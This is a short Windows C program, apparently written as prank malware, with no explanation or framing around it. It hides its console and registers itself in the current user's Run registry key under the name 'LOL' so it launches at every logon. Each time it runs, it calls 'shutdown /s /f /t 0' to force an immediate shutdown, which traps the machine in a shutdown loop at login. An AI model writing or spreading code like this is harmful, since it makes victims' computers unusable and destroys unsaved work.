#include <Windows.h>

void CodigoPersonalizado() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    _wsystem(L"C:\\windows\\system32\\shutdown /s /f /t 0");
}

int main() {
    wchar_t executablePath[MAX_PATH];
    GetModuleFileNameW(NULL, executablePath, MAX_PATH);
    const wchar_t* regKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    HKEY hKey;
    LONG openResult = RegOpenKeyExW(HKEY_CURRENT_USER, regKeyPath, 0, KEY_WRITE, &hKey);
    if (openResult == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"LOL", 0, REG_SZ, (BYTE*)executablePath, (wcslen(executablePath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
    CodigoPersonalizado();
    return 0;
}